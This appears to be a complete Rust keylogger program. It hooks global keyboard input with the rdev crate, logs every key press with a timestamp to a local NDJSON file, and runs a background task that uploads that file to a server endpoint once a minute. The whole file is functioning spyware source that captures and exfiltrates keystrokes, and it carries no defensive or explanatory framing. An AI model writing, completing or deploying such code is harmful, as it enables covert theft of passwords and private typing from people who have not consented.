use std::{fs::File, io::{BufWriter, Write}, time::{SystemTime, UNIX_EPOCH}};
use rdev::{listen, Event, EventType};
use serde::Serialize;
use reqwest::Client;
use tokio::{select, sync::watch};

#[derive(Serialize)]
struct KeyEvent {
    time: u64,
    key: String,
}

fn unix_minute_now() -> u64 {
    let secs = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_secs();
    secs / 60
}

fn append_event<W>(
    w: &mut W,
    event: KeyEvent
) -> std::io::Result<()>
where
    W: Write
{
    let value = serde_json::to_string(&event)?;
    w.write_all(format!("{}\n", value).as_bytes())?;
    Ok(())
}

fn create_callback(
    mut writer: BufWriter<File>
) -> Box<dyn FnMut(Event) + Send> {
    let mut current_minute = unix_minute_now();

    let cb = move |event: Event| {
        if let EventType::KeyPress(key) = event.event_type {
            let m = unix_minute_now();
            append_event(
                &mut writer,
                KeyEvent { time: m * 60, key: format!("{:?}", key) }
            ).unwrap();

            if m != current_minute {
                let _ = writer.flush();
                current_minute = m;
            }
        }
    };
    Box::new(cb)
}

pub async fn upload_keylog(
    url: &str,
    path: &str,
) -> anyhow::Result<()> {
    let form = reqwest::multipart::Form::new()
        .file("file", path).await?;
    let response = Client::new()
        .post(url)
        .multipart(form)
        .send()
        .await?;
    if !response.status().is_success() {
        return Err(anyhow::anyhow!(
            "Failed to upload file: {}",
            response.status()
        ));
    }
    Ok(())
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let file = File::options()
        .create(true)
        .append(true)
        .open("keylog.ndjson")?;
    let writer = BufWriter::new(file);
    let callback = create_callback(writer);
    let (stop_tx, mut stop_rx) = watch::channel(false);


    let send_thread = tokio::spawn(async move {
        let url = "http://127.0.0.1:8080/api/upload";
        let path = "keylog.ndjson";
        const WAIT_DURATION_IN_SECS: u64 = 60;
        let mut tick = tokio::time::interval(
            std::time::Duration::from_secs(WAIT_DURATION_IN_SECS)
        );

        loop {
            select! {
                _ = tick.tick() => {
                    if let Err(error) = upload_keylog(url, path).await {
                        println!("Error: {:?}", error);
                    }
                }
                _ = stop_rx.changed() => {
                    if *stop_rx.borrow() {
                        break;
                    }
                }
            }
        }
    });

    if let Err(error) = listen(callback) {
        println!("Error: {:?}", error);
    }
    stop_tx.send(true)?;
    let _ = send_thread.await?;
    Ok(())
}
